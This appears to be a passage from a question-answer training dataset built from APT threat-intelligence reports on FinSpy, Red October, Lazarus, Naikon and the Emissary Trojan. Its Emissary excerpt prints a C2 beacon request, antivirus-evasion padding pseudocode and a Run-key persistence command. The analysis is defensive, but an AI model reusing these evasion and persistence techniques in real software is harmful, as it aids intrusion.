    "output": "Answer: Researchers face several challenges in accurately identifying and attributing the use of FinSpy servers to specific countries or entities. One challenge is the large diversity of ports used by FinSpy servers, which makes comprehensive detection difficult. Additionally, efforts at concealment, such as hosting servers on commercial hosting providers, complicate attribution. For example, servers found on facilities provided by commercial hosting providers could have been purchased by actors from any country. Furthermore, the dynamic nature of server locations and updates to the FinSpy protocol necessitate continuous adaptation of detection methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: COPYRIGHT\t NOTICE\nCopyright \u00a9 Command Five Pty\t Ltd.\t All rights reserved.\nThis\t document\t is\t provided by\t the copyright holders under the licence that follows.\t By obtaining, using,\t and/or distributing this document you agree that\t you have read, understood,\t and\t agree to the terms and conditions that follow.\nThe names and trademarks of Command Five Pty Ltd may\t not be used in advertising or publicity\t relating to this document or its\t contents without specific,\t prior,\t written permission.\nNo permission is given for this document to be used\t for commercial purposes or as part\t of\t any\t commercial activity\t or undertaking, including,\t but not\t limited to, use in or relating\t to advertising\t or publicity,\t and/or use in support of, or as part of, any\t pre\u00adsales or sales activities.\nNo permission is given to create modified or derivative works.\t You may\t distribute this\t document\t in its original form for non\u00adcommercial purposes in accordance with\t the other terms and\t conditions stated\t herein.\t Copyright title will at all times remain with the copyright holders.\nAll referenced trademarks remain the property\t of\t their respective owners.\nTHIS DOCUMENT\t IS PROVIDED 'AS\t IS' FOR INFORMATIONAL PURPOSES ONLY WITH NO REPRESENTATIONS OR WARRANTIES\t OF ANY KIND, INCLUDING BUT NOT LIMITED TO ANY WARRANTY, EXPRESS OR IMPLIED, OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE; WARRANTY OF\t NON\u00adINFRINGEMENT, OR TITLE; NOR ANY WARRANTIES\t PERTAINING TO\t THE ACCURACY OR COMPLETENESS OF\tCONTENT.\nANY OPINIONS\t EXPRESSED IN THIS DOCUMENT MAY CHANGE WITHOUT NOTICE AND\t ARE NOT NECESSARILY THE CONSIDERED OPINIONS\t OF\t COMMAND\t FIVE PTY LTD, ITS PARTNERS,\t EMPLOYEES, OR AFFILIATE\t ORGANISATIONS.\t ANY ADVICE OFFERED IN THIS DOCUMENT IS OFFERED\tWITHOUT WARRANTY OF ANY KIND.\nCommand Five Pty\t Ltd ABN:\t49 149\t 576\t670\nhttp://www.commandfive.com info@commandfive.com\nQ: In the context of the SK Communications hack by an Advanced Persistent Threat (APT), how does the copyright notice of the report 'C5_APT_C2InTheFifthDomain' impact the distribution and usage of the document?",
    "output": "The copyright notice of the report 'C5_APT_C2InTheFifthDomain' specifies that the document is provided under a license that restricts its usage and distribution. The document cannot be used for commercial purposes, including advertising, publicity, or any pre-sales or sales activities. Additionally, no permission is given to create modified or derivative works. However, the document can be distributed in its original form for non-commercial purposes, with the condition that the copyright title remains with the copyright holders. The document is provided 'as is' for informational purposes only, with no warranties of any kind, including warranties of merchantability, fitness for a particular purpose, non-infringement, or title. Any opinions expressed in the document may change without notice and are not necessarily the considered opinions of Command Five Pty Ltd, its partners, employees, or affiliate organizations. Any advice offered in the document is provided without warranty of any kind.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the attackers behind the Red October APT campaign utilize the CVE-2012-0158 vulnerability in their attacks?",
    "output": "CVE-2012-0158 is a vulnerability in the MSCOMCTL.OCX ActiveX control in Microsoft Office, which allows remote attackers to execute arbitrary code via a crafted web site, Office document, or .rtf file. According to the Red October APT report, the attackers used an exploit for CVE-2012-0158 (MS Word) in their spear phishing attacks, specifically targeting diplomatic and governmental agencies. The attackers embedded their own malicious code in a document, replacing the original executable, and used it to infect victims' machines. This vulnerability was one of the three exploits used by the attackers, along with CVE-2009-3129 (MS Excel) and CVE-2010-3333 (MS Word). The use of CVE-2012-0158 demonstrates the attackers' ability to adapt and evolve their tactics, utilizing known vulnerabilities to gain access to sensitive information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nThis report has introduced several new additions to Lazarus Group's ever-growing arsenal, including a variety of different attack vectors, a new PowerShell implant and Gh0st RAT variant, as well as an emerging point-of-sale threat targeting South Korean devices. In addition to insight into Lazarus' emerging toolset, there are two key takeaways from this research:\n\u2022 Analyzing a financially motivated arm of a state actor highlights an often overlooked or underestimated aspect of state-sponsored attacks; in this case, we were able to differentiate the actions of the financially motivated team within Lazarus from those of their espionage and disruption teams that have recently grabbed headlines.\n\u2022 This group now appears to be targeting individuals rather than just organizations: individuals are softer targets, often lacking resources and knowledge to defend themselves and providing new avenues of monetization for a state-sponsored threat actor's toolkit.\n\u2022 Moreover, both the explosive growth in cryptocurrency values and the emergence of new point-of-sale malware near the peak holiday shopping season provide an interesting example of how one state-sponsored actor is following the money, adding direct theft from individuals and organizations to the more \"traditional\" approach of targeting financial institutions for espionage that we often observe with other APT actors.\nSmall Headline: PowerRatankba Hashes\n41f155f039448edb42c3a566e7b8e150829b97d83109c0c394d199cdcfd20f9b 20f7e342a5f3224cab8f0439e2ba02bb051cd3e1afcd603142a60ac8af9699ba db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471 3cd0689b2bae5109caedeb2cf9dd4b3a975ab277fadbbb26065e489565470a5c b265a5d984c4654ac0b25ddcf8048d0aabc28e36d3e2439d1c08468842857f46 1768f2e9cea5f8c97007c6f822531c1c9043c151187c54ebfb289980ff63d666 99ad06cca4910c62e8d6b68801c6122137cf8458083bb58cbc767eebc220180d f7f2dd674532056c0d67ef1fb7c8ae8dd0484768604b551ee9b6c4405008fe6b d844777dcafcde8622b9472b6cd442c50c3747579868a53a505ef2f5a4f0e26a\nNOTE: Several of these domains reflect themes and brands (only BTG) that are confirmed to have been used in phishing attacks. Additionally, they were registered in the same timeframe, at the same registrar, with matching server characteristics that were observed in the confirmed IDNA infrastructure domains. These domains in no way indicate that they have been used for attacks, nor that the themes utilized indicate that the entity in question has been targeted or compromised. We simply assess that this infrastructure is related to Lazarus Group and currently do not know how or if it was utilized for campaigns.\nRead the text above and answer this question: How does the analysis of the financially motivated arm of Lazarus Group highlight an often overlooked aspect of state-sponsored attacks, and what new avenues of monetization does this group appear to be exploring?",
    "output": "The analysis of the financially motivated arm of Lazarus Group highlights an often overlooked or underestimated aspect of state-sponsored attacks by differentiating the actions of the financially motivated team within Lazarus from those of their espionage and disruption teams that have recently gained attention. This group now appears to be targeting individuals rather than just organizations, as individuals are softer targets who often lack the resources and knowledge to defend themselves. This provides new avenues of monetization for a state-sponsored threat actor's toolkit. Moreover, the explosive growth in cryptocurrency values and the emergence of new point-of-sale malware near the peak holiday shopping season demonstrate how Lazarus Group is following the money, adding direct theft from individuals and organizations to the more 'traditional' approach of targeting financial institutions for espionage that is commonly observed with other APT actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Describe the process by which Trojan.Loader.891 modifies the process memory to move to its main malicious functionality. What specific techniques does it employ to locate necessary functions?",
    "output": "Trojan.Loader.891 modifies the process memory to transition to its main malicious functionality by altering the instruction following the download of the malicious library. It locates the necessary functions by hashing their names and comparing them with the desired hash values. Library names are hashed as Unicode strings converted to upper case, while function names are hashed as ASCII strings without changing the case. The resulting two hashes are added together and then compared with the desired one. This method allows the trojan to dynamically find and utilize the required functions without hardcoding their names, making it harder to detect through static analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the integration of Plugx shellcode in some samples, along with the presence of inactive encrypted Zbot, reflect the evolving relationship between common cybercrime and advanced persistent threats (APTs)?",
    "output": "The integration of Plugx shellcode in some samples, along with the presence of inactive encrypted Zbot, reflects a blurring line between common cybercrime and advanced persistent threats (APTs). The fact that common malware authors are adopting techniques from APT players, such as document-based exploitation, and vice versa, shows a symbiotic relationship where ideas are shared between these distinct criminal groups. This evolution underscores the need for cybersecurity professionals to stay vigilant against both types of threats, as the methods used by one group can quickly be adopted by the other, making attribution and defense more challenging.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Russian Bank Offices Hit with Broad Phishing Wave\nBy far most of the bank-related phishing campaigns described in security advisories and reports consist of bank customers being targeted for their online credentials. Much less common is a phishing campaign targeting the banks themselves. Perhaps fraudsters know that there are a lot more bank customers than there are banks, and generally banks have a more hardened security posture than the average bank's customer.\nRead the text above and answer this question: Why do you think phishing campaigns targeting banks directly are less common compared to those targeting bank customers? How does this insight help cybersecurity experts in improving their strategies against such threats?",
    "output": "Phishing campaigns targeting banks directly are less common because there are significantly fewer banks than there are bank customers, making it more efficient for fraudsters to target the larger pool of customers. Additionally, banks typically have more robust security measures in place compared to individual customers, which makes them harder targets. This insight helps cybersecurity experts by emphasizing the importance of maintaining a strong security posture and investing in advanced defenses. It also highlights the need for continuous monitoring and education to protect both the organization and its clients.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 2 Ukraine as a Cyber Safe Haven\nOnce the internet conquered post-Soviet daily life, many talented computer programmers who had already dabbled in illegal activities such as stealing music and movies realised that they could make a living as professional hackers. There were few cyber security regulations in Ukraine and so, as in so many other countries, cyber crime quickly evolved from a mischievous hobby to a lucrative occupation.8\nSeveral factors contributed to making Ukraine a cyber safe haven. First, its Soviet school STEM (science, technology, engineering, and mathematics) education is among the best in the world. Second, its underwhelming economic performance since independence in 1991 has led these STEM specialists to explore alternative career paths, often online. Third, Ukraine's social and cultural norms dictate that stealing from the West is not always a bad thing. This factor is compounded by the relatively impersonal nature of cyberspace.9\nAt the policy level, 'cyber crimes' such as stealing intellectual property and copyright infringement were not even considered illegal in Ukraine until recently. For instance, the popular Russian social media website vkontakte.ru used to be a source of large-scale music and movie piracy.10 Ukraine recently has begun to develop a common lexicon on cyber security (a pre-requisite for progress in this\nnew domain),11 but the multiple cyber units within the Ukrainian government12 still tend to operate independently, and rarely collaborate.13 Moreover, as in other Eastern European countries, government employees are poorly paid and lack resources, which in turn motivates skilled specialists to leave for the private sector. Finally, due to the high level of corruption in Ukraine, even when a cyber criminal is caught, he or she can usually bribe an official to have the charges reduced or dropped.14\n7 Vlad Styran, Skype interview, July 6, 2015.\n8 Supra, note 5.\n9 The author can testify through personal experience.\n10 Kathryn Dowling. 'VKontakte Case Puts Russian Music Piracy into Spotlight.' August 11, 2014. http://www.bbc.com/news/ business-28739602.\n\nHow did the lack of legal framework and government coordination in Ukraine contribute to the proliferation of cybercrime, and what steps have been taken to address this issue?",
    "output": "A: The lack of a robust legal framework in Ukraine meant that cyber crimes such as intellectual property theft and copyright infringement were not considered illegal until recently. This absence of regulation allowed cybercrime to flourish. Additionally, the multiple cyber units within the Ukrainian government operated independently and rarely collaborated, further hindering effective enforcement. Poorly paid government employees and high levels of corruption exacerbated the problem, as cyber criminals could often bribe officials to avoid prosecution. Recently, Ukraine has started developing a common lexicon on cyber security, which is a pre-requisite for progress in this new domain, although significant challenges remain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Decoy\nAn attack typically starts with an email carrying an attachment that contains information of interest to the potential victim. The document may be based on information from open sources or on proprietary information stolen from other compromised systems.\nThis bait \"document\", or email attachment, appears to be a standard Word document, but is in fact an CVE-2012-0158 exploit, an executable with a double extension, or an executable with an RTLO filename, so it can execute code without the user's knowledge or consent. When the executable is launched, spyware is installed on the victim computer at the same time as a decoy document is displayed to the user; fooling them into thinking they have simply opened a document.\nBig Headline: Configuration\nThe Naikon tool of choice generates a special, small, encrypted file which is 8,000 bytes in size, containing code to be injected into the browser along with configuration data. With the help of a start-up module, this whole file is injected into the browser memory and decrypts the configuration block containing the following:\nC&C server\nPorts and path to the server\nUser-agent string\nFilenames and paths to its components\nHash sums of the user API functions\nThe same code then downloads its main body from the C&C server using the SSL protocol, loads it independently from the operating system functions and, without saving it to the hard drive, hands over control to the XS02 function. All functionality is handled in memory.\nBig Headline: Payload\nThe main module is a remote administration utility. Using SSL, the module establishes a reverse connection to the C&C server as follows: it sets up an outgoing connection to the C&C server and checks if there is a command that it should execute. If there is, it executes the command and returns the result to the C&C. There are 48 commands in the module's repertoire, which a remote operator can use to effectively control the victim computer. This includes taking a complete inventory, downloading and uploading data, installing add-on modules, or working with the command line.\nTweet\nThe main module supports 48 commands, which the attackers can use to control the victim machine #NaikonAPT\nHere is the complete list of commands:\n46 CMD_CONNECTION_TABLE\n50 CMD_HEART_BEAT\nSeveral modifications of the main module exist. There are no fundamental differences between modifications; it's just that extra features get added to the latest versions, such as compression and encryption of transmitted data, or the piecemeal download of large files.\nMedium Headline: There is a geo-specific correlation between the location of #NaikonAPT C&Cs and that of targets/victims\nCommunication with victim systems changed depending on the target involved. In some cases, a direct connection was established between the victim computer and the C&C. In other cases, the connection was established via dedicated proxy servers installed on dedicated servers rented in third countries. In all likelihood, this additional setup was a reaction to the network administrators in some targets limiting or monitoring outbound network connections from their organizations.\nHere is a partial list of C&C servers and victim locations, demonstrating the geo-specific correlation:\nBig Headline: XSControl \u2013 the Naikon APT's \"victim management software\"\nIn the Naikon scheme, a C&C server can be specialized XSControl software running on the host machine. It can be used to manage an entire network of infected clients. In some cases, a proxy is used to tunnel victim traffic to the XSControl server. A Naikon proxy server is a dedicated server that accepts incoming connections from victim computers and redirects them to the operator's C&C. An individual Naikon proxy server can be set up in any target country with traffic tunnelling from victim systems to the related C&C servers.\nXSControl is written in .NET with the use of DevExpress:\nIts main capabilities are:\nAccept initial connections from clients\nProvide clients with the main remote administration module\nEnable them to remotely administer infected computers with the help of a GUI\nKeep logs of client activity\nKeep logs of operator activity\nUpload logs and files to an FTP server\nThe operator's activity logs contain the following:\nAn XML database of downloaded files, specifying the time of operation, the remote path and the local path\nA database of file names, the victim computer registry keys for the folders and requested sections\nA history of executed commands\nBig Headline: Country X, Operator X\nNow let's do an overview of one Naikon campaign, focusing on country \"X\".\nAnalysis revealed that the cyber-espionage campaign against country X had been going on for many years. Computers infected with the remote control modules provided attackers with access to employees' corporate email and internal resources, and access to personal and corporate email content hosted on external services.\nBelow is a partial list of organizations affected by Naikon's \"operator X's\" espionage campaign in country X.\nOffice of the President\nMilitary Forces\nOffice of the Cabinet Secretary\nNational Security Council\nOffice of the Solicitor General\nIntelligence Services\nCivil Aviation Authority\nDepartment of Justice\nFederal Police\nExecutive/Presidential Administration and Management Staff\nA few of these organizations were key targets and under continuous, real-time monitoring. It was during operator X's network monitoring that the attackers placed Naikon proxies within the countries' borders, to cloak and support real-time outbound connections and data exfiltration from high-profile victim organizations.\nIn order to obtain employees' credentials, operator X sometimes used keyloggers. If necessary, operator X delivered them via the remote control client. In addition to stealing keystrokes, this attacker also intercepted network traffic. Lateral movements included copying over and remotely setting up winpcap across desktop systems within sensitive office networks, then remotely setting up AT jobs to run these network sniffers. Some APTs like Naikon distribute tools such as these across multiple systems in order to regain control if it is lost accidentally and to maintain persistence.\n\nHow does the Naikon APT establish and manage communication with victim systems, and what measures are taken to adapt to different network environments?",
    "output": "A: The Naikon APT establishes communication with victim systems through direct connections to the C&C server or via dedicated proxy servers installed on rented servers in third countries. This setup is likely a reaction to network administrators limiting or monitoring outbound connections. The C&C server can be specialized XSControl software running on the host machine, used to manage an entire network of infected clients. Proxy servers accept incoming connections from victim computers and redirect them to the operator's C&C. The XSControl software accepts initial connections from clients, provides them with the main remote administration module, enables remote administration, keeps logs of client and operator activity, and uploads logs and files to an FTP server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The Dropping Elephant \u2013 aggressive cyber-espionage in the Asian region\nKaspersky Lab's Global Research & Analysis Team\nDropping Elephant (also known as \"Chinastrats\" and \"(<https://www.cymmetria.com/patchwork-targeted-attack/>)Patchwork\") is a relatively new threat actor that is targeting a variety of high profile diplomatic and economic targets using a custom set of attack tools. Its victims are all involved with China's foreign relations in some way, and are generally caught through spear-phishing or watering hole attacks.\nOverall, the activities of this actor show that low investment and ready-made offensive toolsets can be very effective when combined with high quality social engineering. We have seen more such open source toolset dependency with meterpreter and BeEF, and expect to see this trend continue.\n\nAnswer this question based on the above context: How does the Dropping Elephant APT group effectively leverage low investment and ready-made offensive toolsets to achieve its goals? What role does social engineering play in these attacks?",
    "output": "The Dropping Elephant APT group effectively leverages low investment and ready-made offensive toolsets by combining them with high-quality social engineering tactics. This approach allows the group to target high-profile diplomatic and economic entities involved with China's foreign relations. The use of spear-phishing and watering hole attacks demonstrates how social engineering can significantly enhance the effectiveness of even basic toolsets like meterpreter and BeEF. By focusing on the human element, the group can successfully compromise targets despite relying on relatively simple and widely available tools.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\n1\n2\n3\n4\n5\nGET /default.aspx HTTP/1.1\nUser\u00adAgent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 101.55.33.95\nCache\u00adControl: no\u00adcache\nCookie: guid=8cdef38c\u00ad808a\u00ad4e29\u00adaf6e\u00ad7386f02d28f1; op=101; SHO=172.16.107.130\nVersion 5.1\nDate: 9/29/2015\nSHA256: 375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\nOriginal Name: WinDLL.dll\nFor version 5.1 the malware author took out the exception handling in the Upload File command and obfuscated two strings within the Trojan to avoid detection. The strings exist in the Trojan in encrypted form and are decrypted using an algorithm that uses addition to each byte of ciphertext, using 65 (\"A\") as a key. The obfuscated strings, as seen below, involve the filename of the log file and the command prompt executable used to create the remote shell:\n\\xEF\\xEF\\xEF\\x00\\xF6\\xF4\\xF7\\x02\\xF7\\x05\\x04\\x00\\x04\\xF4\\x05\\xED\\x13\\x0C\\x0F =\n000A758C8FEAE5F.TMP\n\\x22\\x2C\\x23\\xED\\x24\\x37\\x24 = cmd.exe\nDate: 10/14/2015\nSHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\nOriginal Name: WinDLL.dll\nIn an attempt to avoid detection based on PE header hashes, version 5.1 was recompiled without making any changes.\nVersion 5.3\nDate: 11/7/2015\nSHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\nOriginal Name: WinDLL.dll\nEmissary 5.3 moved some code used to create the remote shell out of a sub\u00adfunction in an attempt to evade signatures used to detect the remote shell creation. For instance, in Emissary 5.1 the command handler would call an initial subfunction that would then call a second subfunction to carry out the activities to create and interact with the remote shell. In 5.3, the command handler calls an initial subfunction that carries out the activities to create and interact with the remote shell.\nVersion 5.4\nDate: 11/23/2015\nSHA256: 69b1d5454abe2475257defd9962a24a92411212c4f592de8765369a97f26c037 (Base DLL with junk data removed)\nOriginal Name WinDLL.dll\nVersion 5.4 of Emissary was the basis for the blog \"\" by Michael Yip of PWC. This blog provides a great analysis of this version of Emissary and we highly suggest reading it to become familiar with the Trojan.\nThere is one difference in the functional code between Emissary versions 5.3 and 5.4, which involves the removal of the command '107' used to update the Trojan. The string '107' still exists within the Trojan, however, the command handler does not check the C2 response for this command and the code used to update the Trojan has been removed.\nThe major difference between Emissary version 5.4 and all previous versions is how the Trojan is saved and loaded. First, the filenames of the various components of Emissary changed to the following; however, the filename for debug logs has not changed:\n1\n2 3\n4 5\n6\n7\n%APPDATA%\\Programs\\Syncmgr.dll \u00ad> Loader Trojan\n%APPDATA%\\Programs\\60HGBC00.DAT \u00ad> Configuration File\n%APPDATA%\\Programs\\WEB2013BW6.DAT \u00ad> Emissary Trojan\n%TEMP%\\000A758C8FEAE5F.TMP \u00ad> Log file\nIn addition to file name changes, the biggest (pardon the pun) change involves the Loader Trojan (Syncmgr.dll) appending junk data to the end of the Emissary DLL file to make incredibly large files. The reason for creating such large files is to trick antivirus applications into not scanning the file, as it could exceed the maximum size of files the antivirus can scan (even VirusTotal has a maximum file size of 128MB). For instance, the following pseudo code contains two loops that will end up appending 524,288,000 bytes to the end of file, resulting in a DLL that exceeds 500MB in size:\n1\n2 3\n4 5 6\n7 8\n9\n10\n11\n12\n13 14\n15\n16\n17\n18\nWriteFile(hFile, buf_EmissaryDllFromResource, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0); buf_junkData = 0; ret_time = time(0); srand(ret_time);\n{\nrandom_byte = rand() % 255;\noffset_in_buff_junkData = &buf_junkData + 16 * j;\ndword_junkData = 0x1010101 * random_byte;\n*offset_in_buff_junkData = dword_junkData;\n*(offset_in_buff_junkData + 1) = dword_junkData;\n*(offset_in_buff_junkData + 2) = dword_junkData;\n*(offset_in_buff_junkData + 3) = dword_junkData;\n}\nWriteFile(hFile, &buf_junkData, 0x2800u, &nNumberOfBytesToWrite, 0);\n}\nWith the new filenames, malware persistence is achieved via the following registry key:\n1 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Syncmgr: \"rundll32.exe \"C:\\Documents and\nSettings\\[username]>\\Application Data\\Programs\\Syncmgr.dll\",Setting\"\nDate: 11/24/2015\nSHA256: bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636 (Base DLL with junk data removed)\nOriginal Name: WinDLL.dll\nIn another attempt to avoid detection based on PE header hashes, the Trojan was recompiled without making any changes.\n\nHow did the authors of the Emissary Trojan modify the code in version 5.3 to evade detection signatures, and what specific changes were made to the command handler and subfunctions?",
    "output": "In Emissary 5.3, the authors moved some code used to create the remote shell out of a subfunction to evade detection signatures. Specifically, in Emissary 5.1, the command handler called an initial subfunction that then called a second subfunction to create and interact with the remote shell. In version 5.3, the command handler directly calls an initial subfunction that carries out these activities, thereby reducing the number of subfunction calls and potentially evading signature-based detection mechanisms.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Malware infections\nBecause almost all of the computers at Microsoft run real-time security software at all times, most infection attempts are detected and blocked before they are able to infect the target computer. When Defender or SCEP do disinfect a computer, it is usually because the software's signature database has been updated to enable it to detect a threat that it did not recognize when the computer first encountered the threat. This lack of recognition may be because the threat is a new malware family, a new variant of a known family, a known variant that has been encrypted or otherwise repackaged to avoid detection, or because of some other reason. The MMPC constantly analyzes malware samples submitted to it, develops appropriate detection signatures, and deploys them to customers who use SCEP, Microsoft Security Essentials, and Windows Defender.\nFigure 92. Infections and removals at Microsoft in 1H15, by category\nAs this chart shows, detection and infection statistics were significantly different in 1H15. Adware, which accounted for more than 1.2 million detections at Microsoft in 1H15, was not discovered on a single computer internally during the period. Most of the other categories also show clear differences between (<>)Figure (<>)89 and (<>)Figure 92, although the ordering in the latter chart is significantly influenced by the low volumes involved.\nFigure 93. Infections and removals at Microsoft in 1H15, by file type\nMedium Headline: What IT departments can do to protect their users\n\uf0b7 Evaluate commercially available management tools, develop a plan, and implement a third-party update mechanism to disseminate non-Microsoft updates.\n\uf0b7 Ensure that all software deployed on computers in the environment is updated regularly. If the software provider offers an automatic update utility similar to Microsoft Update, ensure that it is enabled by default. See (<http://windows.microsoft.com/en-us/windows/turn-automatic-updating-on-off>)\"Turn (<http://windows.microsoft.com/en-us/windows/turn-automatic-updating-on-off>)automatic updating on or off\" at windows.microsoft.com for instructions on enabling automatic updates of Microsoft software.\n\uf0b7 Ensure that SmartScreen Filter is enabled in Internet Explorer. See (<http://windows.microsoft.com/en-US/internet-explorer/use-smartscreen-filter>)\"SmartScreen Filter: frequently asked questions\" at windows.microsoft.com for more information.\n\uf0b7 Use Group Policy to enforce configurations for Windows Update, Windows Firewall, and SmartScreen Filter. See Knowledge Base article (<http://support.microsoft.com/kb/328010>)KB328010 at support.microsoft.com, and (<https://technet.microsoft.com/library/jj717241.aspx>)\"Windows Firewall with Advanced Security (<https://technet.microsoft.com/library/jj717241.aspx>)Deployment Guide\" and (<http://technet.microsoft.com/library/jj618329.aspx>)\"Manage Privacy: SmartScreen Filter and Resulting (<http://technet.microsoft.com/library/jj618329.aspx>)Internet Communication\" at technet.microsoft.com for instructions.\n\uf0b7 Set the default configuration for antimalware to enable real-time protection across all drives, including removable devices.\n\uf0b7 Enable (<http://blogs.technet.com/b/mmpc/archive/2015/01/20/maps-in-the-cloud_3A00_-how-can-it-help-your-enterprise_3F00_.aspx>)Microsoft Active Protection Service (MAPS) advanced membership in Windows Defender and Microsoft Security Essentials in your organization to protect your enterprise software security infrastructure in the cloud.\nFigure 94. Enabling MAPS advanced membership in Windows Defender\n\uf0b7 Identify business dependencies on Java and develop a plan to minimize its use where it is not needed.\n\uf0b7 Use AppLocker to block the installation and use of unwanted software such as Java or peer-to-peer (P2P) applications. See (<http://technet.microsoft.com/library/ee619725(v=WS.10).aspx>)\"AppLocker: Frequently (<http://technet.microsoft.com/library/ee619725(v=WS.10).aspx>)Asked Questions\" at technet.microsoft.com for more information.\n\uf0b7 Implement the Enhanced Mitigation Experience Toolkit (EMET), if possible, to minimize exploitation of vulnerabilities in all software in your environment. See (<http://technet.microsoft.com/security/jj653751>)technet.microsoft.com/security/jj653751 for more information.\n\uf0b7 Implement strong password policies, and require employees to change their passwords periodically.\n\uf0b7 Strengthen authentication by using smart cards. See (<http://technet.microsoft.com/library/dd277362.aspx>)\"Smart Cards\" at technet.microsoft.com for more information.\nUse Network Access Protection (NAP) and DirectAccess (DA) to enforce compliance policies for firewall, antimalware, and patch management on remote systems that connect to a corporate network. See (<http://msdn.microsoft.com/library/windows/desktop/aa369712(v=vs.85).aspx>)\"Network Access Protection\" at msdn.microsoft.com and (<http://technet.microsoft.com/video/windows-7-directaccess-explained.aspx>)\"Windows 7 DirectAccess Explained\" at technet.microsoft.com for more information.\nAppendixes\nAppendix A: Threat naming conventions ..............................123\nAppendix B: Data sources ...........................................................125\nAppendix C: Worldwide encounter and infection rates....127\nGlossary.............................................................................................132\nThreat families referenced in this report................................ 141\nIndex ..................................................................................................148\nBig Headline: Appendix B: Data sources\nData included in the Microsoft Security Intelligence Report is gathered from a wide range of Microsoft products and services whose users have opted in to provide usage data. The scale and scope of this telemetry data allows the report to deliver the most comprehensive and detailed perspective on the threat landscape that is available in the software industry:\n\uf0b7 \uf0b7 \uf0b7 The (<http://www.microsoft.com/security/pc-security/malware-removal.aspx>)Malicious Software Removal Tool (MSRT) is a free tool that Microsoft designed to help identify and remove specific prevalent malware families from customer computers. The MSRT is primarily released as an important update through Windows Update, Microsoft Update, and Automatic Updates. A version of the tool is also available from the Microsoft Download Center. The MSRT was downloaded and executed more than 600 million times each month on average in 1H15. The MSRT is not a replacement for an up-to-date real-time antivirus solution.\n\uf0b7 The (<http://www.microsoft.com/security/scanner>)Microsoft Safety Scanner is a free downloadable security tool that provides on-demand scanning and helps remove malware and other malicious software. The Microsoft Safety Scanner is not a replacement for an up-to-date antivirus solution, because it does not offer real-time protection and cannot prevent a computer from becoming infected.\n\uf0b7 \uf0b7 Malware Protection Engine and the Microsoft antivirus signature database to provide real-time, scheduled, and on-demand protection.\n\uf0b7 \uf0b7 \uf0b7 \uf0b7 Figure 96. US privacy statements for the Microsoft products and services used in this report\nBig Headline: Appendix C: Worldwide encounter and infection rates\nFigure 97. Encounter and infection rates for locations around the world, 1Q15\u20132Q15, by quarter (100,000 computers reporting minimum)\n22 Encounter rate and CCM are shown for locations with at least 100,000 computers running Microsoft real-time security products and the Malicious Software Removal Tool, respectively, during a quarter. Only computers whose users have opted in to provide data to Microsoft are considered when calculating encounter and infection rates.\nMedium Headline: ActiveX control\nA software component of Microsoft Windows that can be used to create and distribute small applications through Internet Explorer. ActiveX controls can be developed and used by software to perform functions that would otherwise not be available using typical Internet Explorer capabilities. Because ActiveX controls can be used to perform a wide variety of functions, including downloading and running programs, vulnerabilities discovered in them may be exploited by malware. In addition, cybercriminals may also develop their own ActiveX controls, which can do damage to a computer if a user visits a webpage that contains the malicious ActiveX control.\nMedium Headline: rooting\nObtaining administrative user rights on a mobile device through the use of exploits. Device owners sometimes use such exploits intentionally to gain access to additional functionality, but these exploits can also be used by attackers to infect devices with malware that bypasses many typical security systems. The term \"rooting\" is typically used in the context of Android devices; the comparable process on iOS devices is more commonly referred to as jailbreaking.\nMedium Headline: social engineering\nA technique that defeats security precautions by exploiting human vulnerabilities. Social engineering scams can be both online (such as receiving email messages that ask the recipient to click the attachment, which is actually malware) and offline (such as receiving a phone call from someone posing as a representative from one's credit card company). Regardless of the method selected, the purpose of a social engineering attack remains the same\u2014to get the targeted user to perform an action of the attacker's choice.\n\nHow does the Microsoft Malware Protection Center (MMPC) handle new or unknown malware threats, and what steps are taken to ensure that these threats are eventually detected and removed?",
    "output": "A: The MMPC constantly analyzes malware samples submitted to it. When a new or unknown threat is encountered, it may not be recognized immediately due to various reasons such as being a new malware family, a new variant, or an encrypted version of known malware. The MMPC develops appropriate detection signatures for these threats and deploys them to customers using SCEP, Microsoft Security Essentials, and Windows Defender. This process ensures that even if a threat is initially missed, it will be detected and removed once the signature database is updated.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
